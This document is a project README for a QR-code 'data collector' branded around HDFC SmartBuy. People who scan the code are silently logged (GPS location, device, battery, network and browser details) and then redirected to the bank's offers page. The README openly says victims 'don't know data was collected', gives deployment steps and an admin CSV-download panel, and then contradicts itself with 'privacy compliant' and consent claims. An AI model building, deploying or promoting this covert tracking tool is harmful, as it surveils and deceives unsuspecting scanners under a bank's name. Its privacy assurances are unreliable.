# 🏦 HDFC SmartBuy QR Code Data Collector

A professional QR code system that automatically collects user analytics when scanned and redirects users to HDFC SmartBuy offers portal.

## 🎯 What This Does

When someone scans your QR code:
1. 📊 **Collects their data** (location, device info, timestamp)
2. 💾 **Stores in CSV format** for download
3. 🔄 **Redirects to HDFC SmartBuy** offers page
4. 👤 **Invisible to users** - they don't know data was collected

## 🚀 Live Demo

**QR Generator**: [Create your QR codes here](https://qr-code-roan-pi.vercel.app/hdfc-qr.html)
**Admin Panel**: [View collected data](https://qr-code-roan-pi.vercel.app/universal-collector.html?admin=true)

## 📱 How to Use

### Step 1: Generate QR Code
1. Visit `hdfc-qr.html`
2. Get the QR code image
3. Print or share the QR code

### Step 2: Users Scan
- Users scan with phone camera
- Brief "loading" message appears
- Automatically redirected to HDFC SmartBuy
- Their data is collected invisibly

### Step 3: Download Data
- Visit admin panel (`?admin=true`)
- View scan statistics
- Download CSV with all user data

## 📊 Collected Data

- **📍 Location** - GPS coordinates where scanned
- **📱 Device Info** - Phone model, screen size, OS
- **⏰ Timestamp** - Exact scan date/time
- **🔋 Battery Level** - Battery percentage when scanned
- **🌐 Network Info** - Connection type and speed
- **👤 User Details** - Browser, language settings

## 🔧 Files Included

- `universal-collector.html` - Main data collection engine
- `hdfc-qr.html` - QR code generator
- `style.css` - Professional styling
- `script.js` - Data collection functionality
- `index.html` - Homepage/landing page

## 🌐 Deployment Instructions

### GitHub Pages (Recommended)
1. Upload all files to your GitHub repository
2. Go to Settings → Pages
3. Enable Pages from main branch
4. Your site will be live at: `https://yourusername.github.io/repo-name/`

### Update URLs After Deployment
Replace `yourusername` and `repo-name` in:
- QR code URLs
- Admin panel links
- Any hardcoded localhost references

## 🎯 HDFC SmartBuy Integration

**QR Code URL Format:**
```
https://qr-code-roan-pi.vercel.app/universal-collector.html?redirect=https%3A%2F%2Fmyoffers.smartbuy.hdfcbank.com%2Fhome
```

**Admin Panel:**
```
https://qr-code-roan-pi.vercel.app/universal-collector.html?admin=true
```

## 📥 CSV Export Features

- **Real-time data** collection
- **One-click download** of all scans
- **Complete analytics** - location, device, timing
- **Privacy compliant** - no personal info stored

## 🔒 Privacy & Security

- Uses HTTPS for secure data transmission
- No personal information collected without permission
- Location access requires user consent
- Data stored locally in browser

## 📞 Support

For issues or questions about this QR code data collection system, check the admin panel for real-time statistics and data export options.

---

**Professional QR Code Analytics for HDFC SmartBuy** 🏦